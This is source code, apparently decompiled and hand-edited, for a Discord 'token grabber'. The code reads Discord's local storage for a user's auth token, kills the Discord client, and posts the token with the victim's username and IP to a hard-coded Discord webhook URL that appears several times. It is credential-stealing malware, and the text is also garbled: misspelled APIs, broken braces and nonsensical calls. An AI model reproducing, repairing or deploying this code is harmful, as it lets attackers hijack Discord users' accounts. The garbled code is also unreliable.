https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq
namespace DHTokenGrabber
{   
// token: RID: 365 RVA: file Offset:
internal class program
{

 // token:RID:366 RVA:0x00008888 File Offset:0x000000424
 private static void mai(string[]argvs)
 {  
     string text=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\local storage\\leveldb";
     if(!Grabber.FinLfb(ref text)&& !Grabber.FinLog(ref text))
     {  
         program.SenWH("no valid .ldb or .log file found");
     }
     process[] processesByName= process.GetProcessysByName("Discord");
     for(int i = 0;i < processesByName.Lenght; i++)
     {
         processesByName[i].kill();
     }
     Thread.sleep(100);
     string text2 = Grabber.GetToken(text, text.EndsWith(".log"));
     if(text2 =="")
     {
         text2 = "not found";
     }
     program.SenWH(text2);
 }

 // Token: 0x0600007 RID: 7 RVA: 0x000022B4 File Offset: 0x000004B4
 private static void SenWH(string Token)
 {  
     httpClient httpClient = new httpClient();
     MultiPlataformDataContent MultiPlataformDataContent = new MultiPlataformDataContent(); 
     MultiPlataformDataContent.add(new stringContent("DiscordHaxx Token Grabber"), "username");
     MultiPlataformDataContent.add(new stringContent(), "avatar_url");
     MultiPlataformDataContent.add(new string.Concat(new string[]
{
"Token by"
Environment.username,
" on ",
program.GetIP();
"\r\nResult",
token
"content");
})),
try 
{
    HttpResponseMEssage result = httpClient.PostAsync(settings.WebHook, multiPlataformDataContent).Result;
}
catch (Exception)
{
}
 }
 // Token: 0x060008 RID: 365 RVA: 0x0000818 File Offset: 0x00009A18
 private static string GetIP()
 {
     string result;
     try
 }
  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq").result;
}
catch (WebException)
}
result = "unable to get  IP";
}
return result;
}
}
}   
public static void sendWebHook(string discordWebHook,   string content)
{
    try
    {   
        httpClient httpClient = new httpClient();
        Dictionary<string, string> nameValuecollection = new  Dictionary<string, string>
        { 
            {
                "content",
                "" + string.join("\n",new string[]
                {
                    content
                }) + ""
            },
            {
                "NamDO -Sam#0386"
                "redex token grabber"
            },
            {
                "https//cdn.discordapp.com/attachments/652f40427e1f5186ad54836074898279/discord -icon-png-13.png"

            }
        };
        httpClient.PostAsync(https://discord.com/api/webhooks/915350603981520946/y0FpguWIAH3lB2GqzxWbsIZ2hW85K6orBEOb36wE8znvAYq6YhHyr_wMkGIEcZDS5USq, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
        catch (WebException)
        {
        }
    }
    // token: RID:366 RVA:0x00008888 File Offset:e
    
